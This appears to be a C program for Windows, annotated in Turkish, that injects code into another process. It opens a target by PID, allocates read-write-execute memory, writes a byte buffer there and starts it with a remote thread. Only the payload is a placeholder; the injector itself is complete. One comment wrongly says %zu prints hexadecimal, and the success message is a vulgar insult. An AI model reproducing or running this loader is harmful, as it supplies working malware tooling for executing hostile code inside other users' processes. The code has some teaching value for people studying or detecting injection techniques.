#include <Windows.h>
#include <stdio.h>

/* Program Messages */
const char* successfulMessage = "[+]"; 
const char* errorMessage = "[-]";
const char* informationMessage = "[*]";

/* Important Variables */
DWORD PID, TID = NULL;
HANDLE hProcess, hThread = NULL; /* For Process Operations */
LPVOID rBuffer = NULL;   		 /* For VirtualAllocEx*/
unsigned char bekoPuke[] = "\x41\x41\x41\x41\x41\x41\x41\x41";

int main(int argc, char* argv[]) {
	
	if (argc < 2) {
		/*printf("%s UH OH... Usage: ./bekooM.exe <PID>", errorMessage, argv[0]); */
		return EXIT_FAILURE;
	}
	PID = atoi(argv[1]);
	printf("%s Wow! Nice %ld PID!\n", successfulMessage, PID);
	
	if ((hProcess = OpenProcess(
		PROCESS_ALL_ACCESS,	/* Bu Parametre, Process'in gerekli izinlerini temsil eder. */
		FALSE,				/* Bu Parametre, handle durumunu devralmak	bilgisini temsil eder. */
		PID					/* Bu Parametre,  PID'i temsil eder. */
	)) != NULL) {
		printf("%s HOPPP! Got a handle to the Process! \n\\---0x%p\n", successfulMessage, hProcess);
		/* 
			%p formatı, pointer'in değerini hexdecimal olarak ekrana bastırmak için kullanılır. 
		*/
		/* 
		* 
			LPVOID tipinde oluşturduğumuz rBuffer^değişkenine VirtualAllocEx API'sinin başlangıç adresini gönderiyoruz.
			LPVOID olma sebebi, VirtualAllocEx'in döndürdüğü başlangıç Adresi LPVOID tipinde olmasıdır. 

		*/
		rBuffer = VirtualAllocEx(
			hProcess,					/* Bu Parametre, yer ayrılması istenen handle'i temsil eder. */
			NULL,						/* Bu Parametre, istenilen başlangıç adresini temsil eder. NULL olması takdirde sistem tarafından otomatik atanır.*/
			sizeof(bekoPuke),			/* Bu Parametre, bellek alanın boyutunu temsil eder. */
			(MEM_COMMIT | MEM_RESERVE),	/* 
				Bu Parametreyi adım adım açıklayayım:
				MEM_RESERVE --> MEM_RESERVE, ayrılan bellek bölümünü rezerve edilmesini sağlar. Alanın rezerve edilmesi demek, rezerve edilen amaç dışında
				kod çalıştırılmasına izin verilmez. Rezerve edilme sürecinde bu alan fiziksel belleğe atanmadan sanal olarak işlev görür. 

				MEM_COMMIT --> MEM_COMMIT ise Rezerve edilen alan kullanıma hazır hale getirildiğinde fiziksel belleğe atanır. Fiziksel belleğe atandığında
				diğer process'ler bu alanı okuyabilir ve yazabilir. 
			*/
			PAGE_EXECUTE_READWRITE		/* Bu Parametre, Bellek işlem izinlerini temsil eder. (PAGE_EXECUTE_READWRITE: Belleğe yazma, okuma ve çalıştırma izni) */
		);
		printf("%s Allocated %zu-bytes with rwx permissions", informationMessage, sizeof(bekoPuke));
		/*
			%zu formatı ise sizeof fonksiyonun döndüreceği değeri hexdecimal olarak çıktı verir. 
		*/
		WriteProcessMemory(
			hProcess,			/* Bu Parametre, Process Handle'i temsil eder. */
			rBuffer,			/* Bu Parametre, Process içerisinde ayrılan bellek bölümün başlangıç adresini temsil eder. */
			bekoPuke,			/* Bu Parametre, Process'e yazdırılmak istenen değeri temsil eder. */
			sizeof(bekoPuke),	/* Bu Parametre, yazdırılmak istenen değerin boyutunu temsil eder. */
			NULL
		);

		/* Payload'ı çalıştırmak için uzaktan Thread (Remote Thread) Oluşturma */
		if ((hThread = CreateRemoteThreadEx(
			hProcess,
			NULL,		/* Bu Parametre, Thread'in güvenlik özelliklerini temsil eder. NULL ie varsayılan güvenlik özellikleri kullanır. */
			0,			/* Bu Parametre, Stack boyutunu temsil eder. 0 ile sistem tarafından varsayılan stack boyutu kullanılır. */
			(LPTHREAD_START_ROUTINE)rBuffer,	/* Bu Parametre, Thread'in başlangıç adresini temsil eder. */
			NULL,		
			0,
			0,
			&TID		/* Bu Parametre, oluşturulan Remote-Thread'in adresini tutar. */
			)) != NULL) {	

			printf("%s Got a Handle to the Thread %ld\n\\---0x0%p", informationMessage, TID, hThread);
			printf("\n\n %s Cleaning Up\n", informationMessage);
			CloseHandle(hThread);
			CloseHandle(hProcess);
			printf("Ya bi siktir git process enjekte edecegine azicik kitap oku amk koylusu!\n");

		}
		else {
			printf("%s OH! Failed to get a Handle to the Thread! Error Code: %ld", errorMessage, GetLastError());
			CloseHandle(hProcess);
			return EXIT_FAILURE;
		}
	}
	else {
		/* Bu kısımda OpenProcess API'si NULL sonucu döndürdüğünde hata mesajı ekrana bastırır. */
		printf("%s Ahh..! couldn't get Handle to the your Process %ld. Error: %ld", errorMessage, PID, GetLastError());
		return EXIT_FAILURE;
	}
	
	return EXIT_SUCCESS;
}